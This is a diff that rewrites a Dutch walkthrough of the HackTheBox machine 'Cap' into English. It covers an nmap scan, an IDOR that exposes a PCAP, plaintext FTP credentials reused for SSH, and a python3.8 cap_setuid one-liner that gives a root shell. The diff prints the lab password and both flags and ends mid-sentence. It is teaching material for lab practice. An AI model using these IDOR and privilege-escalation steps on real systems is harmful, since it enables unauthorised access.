@@ -1,66 +1,78 @@
-[Begin gesproken tekst]
+All right, let’s dive into the HTB machine **Cap**, rated Easy. I’ll walk you through the recon, the initial foothold via an IDOR, the privilege‑escalation using a mis‑configured Linux capability, and finish with the key takeaway for anyone doing red‑team or blue‑team work.
 
-Welkom bij deze korte technische deep‑dive van de HackTheBox‑machine **Cap**, rated Easy. Ik loop je stap voor stap door de reconnaissance, de initiële toegang en de privilege‑escalatie, met concrete commando’s en tools die je zelf kunt naspelen.
+**Recon**  
+We start with a full‑service scan:  
 
-We starten met een standaard poortscan. Op het doelwit 10.129.19.233 voer ik uit:
-
-```
+```bash
 nmap -sC -sV 10.129.19.233
-```
+```  
 
-Het resultaat laat drie open poorten zien:
+The scan returns three open ports:  
 
-- 21/tcp, open, **vsftpd 3.0.3**
-- 22/tcp, open, **OpenSSH 8.2p1** op Ubuntu
-- 80/tcp, open, **Gunicorn** dienst die een web‑applicatie serveert genaamd “Security Dashboard”
+- **21/tcp** – vsftpd 3.0.3  
+- **22/tcp** – OpenSSH 8.2p1 on Ubuntu 4ubuntu0.2  
+- **80/tcp** – Gunicorn serving a web app called “Security Dashboard”.
 
-Anonieme FTP‑login wordt geprobeerd, maar levert geen toegang op, dus we richten ons op de web‑service op poort 80.
+Anonymous FTP login is tried and fails, so we turn to the web interface. The dashboard offers three endpoints: `/capture`, `/ip`, and `/netstat`. `/capture` always issues a 302 redirect to `/data/1`, but by manually requesting lower IDs we discover an IDOR:
 
-Een snelle blik op de applicatie laat drie endpoints zien in de navigatie: `/capture`, `/ip` en `/netstat`. Het `/capture` endpoint redirect altijd naar `/data/1` en presenteert een vijf‑seconden PCAP‑snapshot met analyse. Door handmatig te proberen met lagere ID’s ontdekken we een IDOR:
-
-```
+```bash
 curl -s http://10.129.19.233/data/0
-```
+```  
 
-Deze request retourneert een pagina met een download‑knop naar `/download/0`. We halen het bestand op:
+That returns a page with a **Download** button linking to `/download/0`. The same pattern works for `/download/1`, `/download/2`, etc., indicating sequential, unchecked numeric IDs.
 
-```
+**Exploitation – IDOR → plaintext FTP creds**  
+We grab the PCAP from `/download/0`:
+
+```bash
 curl -s http://10.129.19.233/download/0 -o capture.pcap
-```
+```  
 
-Nu analyseren we de PCAP met **tshark**, specifiek op FTP‑verkeer omdat we weten dat de FTP‑dienst draait:
+Then we inspect it with tshark, filtering for FTP traffic:
 
-```
+```bash
 tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
-```
+```  
 
-De output toont in platte tekst:
+The output shows the FTP session in clear text:
 
 ```
 USER    nathan
 PASS    Buck3tH4TF0RM3!
-```
+```  
 
-Deze credentials zijn precies wat we nodig hebben voor SSH. We maken een verbinding als de gebruiker *nathan*:
+Those credentials are reused for SSH:
 
-```
+```bash
 ssh nathan@10.129.19.233
-# wachtwoord: Buck3tH4TF0RM3!
-```
+```  
 
-Na succesvolle authenticatie vinden we de user flag in het home‑directory: `2874475212d535da1ca01f207b3a6939`.
+Password: **Buck3tH4TF0RM3!**  
+We land as user *nathan* and retrieve the user flag: `2874475212d535da1ca01f207b3a6939`.
 
-Voor privilege escalation beginnen we met het opsporen van Linux capabilities. Een snelle recursive search met **getcap** onthult een interessante vind:
+**Privilege Escalation – Linux capability abuse**  
+Post‑user enumeration we run a capability search:
 
-```
+```bash
 getcap -r / 2>/dev/null
-```
+```  
+
+The result highlights a mis‑configured Python binary:
 
 ```
 /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
-```
+```  
 
-Het binaire `/usr/bin/python3.8` bezit de `cap_setuid` capability, waardoor het proces zijn eigen UID kan veranderen naar 0 (root) zonder dat het SUID‑bit nodig is. We exploiteren dit direct met een één‑liner:
+The `cap_setuid` flag lets the process change its own UID to 0 without needing a SUID bit. We exploit it with a one‑liner:
 
-```
-python3.8 -c 'import os; os.setuid(0
+```bash
+python3.8 -c 'import os; os.setuid(0); os.system("bash")'
+```  
+
+Spawning a shell gives us root (`uid=0(root)`) and we can read the root flag: `006b90cfdd1f951eb31fe3278eb85847`.
+
+**Key Takeaway**  
+For security professionals, this machine reinforces three practical habits:  
+
+1. **Enumerate IDORs on sequential numeric endpoints** – always try IDs 0, 1, 2 etc.; missing access controls leak sensitive files like PCAPs.  
+2. **Never trust clear‑text protocols** – FTP credentials appear in
